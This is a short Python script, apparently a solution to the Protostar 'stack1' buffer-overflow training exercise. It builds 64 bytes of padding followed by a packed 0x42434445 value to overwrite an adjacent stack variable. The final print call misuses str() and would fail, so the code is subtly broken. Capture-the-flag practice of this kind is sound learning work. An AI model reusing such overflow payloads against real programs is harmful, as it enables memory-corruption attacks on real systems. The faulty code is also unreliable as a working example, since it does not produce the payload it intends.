# Stack1 Protostar

import struct

padding = "\x41" * 64
payload = struct.pack("I", 0x42434445)

print(str(padding, payload))
